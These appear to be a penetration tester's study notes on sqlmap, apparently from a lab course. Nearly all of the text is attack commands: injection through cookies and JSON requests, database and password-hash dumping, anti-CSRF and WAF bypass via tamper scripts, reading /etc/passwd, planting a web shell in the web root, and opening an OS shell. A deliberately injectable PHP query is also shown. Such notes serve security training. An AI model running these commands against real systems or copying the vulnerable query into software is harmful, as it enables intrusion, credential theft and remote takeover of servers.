

# INJECTION METHODS


-  SQL INJECTION IN COOKIE

```
sqlmap -u "http://94.237.53.53:33035/case3.php" --batch --dump --cookie="id=1*"
```

-  SQL INJECTION IN JSON DATA

```
sqlmap -r req.txt --dump --os-shell
```

# Handling SQLMap Errors

- Display Errors

```
--parse-errors
```

show error in output

- Store the Traffic

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```
stores traffic in traffic.txt

- Verbose Output

```shell-session
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

- Using Proxy

```
--proxy=http://127.0.0.1:8080
```

# Attack Tuning

- adding prefix and suffix to the payload
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

```php
$query = "SELECT id,name,surname FROM users WHERE id LIKE (('" . $_GET["q"] . "')) LIMIT 0,1";
$result = mysqli_query($link, $query);
```

works perfectly in this situation

- Level/Risk

```
- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
    
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).
```

# Advanced Database Enumeration

- DB Schema Enumeration
```shell-session
--schema
```

- Searching for Data
```shell-session
 --search -T user
```

T => Table
C => column

- DB Users Password Enumeration and Cracking

```shell-session
--passwords --batch
```

- Anti-CSRF Token Bypass

```shell-session
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

- randomize paramters

```shell-session
sqlmap -u "http://www.example.com/?id=1&rp=29125" --randomize=rp --batch -v 5 | grep URI
```

- Hash to be supplied in `h` parameter
```shell-session
sqlmap -u "http://www.example.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch -v 5 | grep URI
```


- Tamper script

|**Tamper-Script**|**Description**|
|---|---|
|`0eunion`|Replaces instances of UNION with e0UNION|
|`base64encode`|Base64-encodes all characters in a given payload|
|`between`|Replaces greater than operator (`>`) with `NOT BETWEEN 0 AND #` and equals operator (`=`) with `BETWEEN # AND #`|
|`commalesslimit`|Replaces (MySQL) instances like `LIMIT M, N` with `LIMIT N OFFSET M` counterpart|
|`equaltolike`|Replaces all occurrences of operator equal (`=`) with `LIKE` counterpart|
|`halfversionedmorekeywords`|Adds (MySQL) versioned comment before each keyword|
|`modsecurityversioned`|Embraces complete query with (MySQL) versioned comment|
|`modsecurityzeroversioned`|Embraces complete query with (MySQL) zero-versioned comment|
|`percentage`|Adds a percentage sign (`%`) in front of each character (e.g. SELECT -> %S%E%L%E%C%T)|
|`plus2concat`|Replaces plus operator (`+`) with (MsSQL) function CONCAT() counterpart|
|`randomcase`|Replaces each keyword character with random case value (e.g. SELECT -> SEleCt)|
|`space2comment`|Replaces space character ( ) with comments `/|
|`space2dash`|Replaces space character ( ) with a dash comment (`--`) followed by a random string and a new line (`\n`)|
|`space2hash`|Replaces (MySQL) instances of space character ( ) with a pound character (`#`) followed by a random string and a new line (`\n`)|
|`space2mssqlblank`|Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters|
|`space2plus`|Replaces space character ( ) with plus (`+`)|
|`space2randomblank`|Replaces space character ( ) with a random blank character from a valid set of alternate characters|
|`symboliclogical`|Replaces AND and OR logical operators with their symbolic counterparts (`&&` and `\|`)|
|`versionedkeywords`|Encloses each non-function keyword with (MySQL) versioned comment|
|`versionedmorekeywords`|Encloses each keyword with (MySQL) versioned comment|

-  Checking for DBA Privileges
```shell-session
--is-dba
```

if yes

```shell-session
--file-read "/etc/passwd"
```

```shell-session
--file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

```shell-session
--os-shell
```

```shell-session
--os-shell --technique=E
```




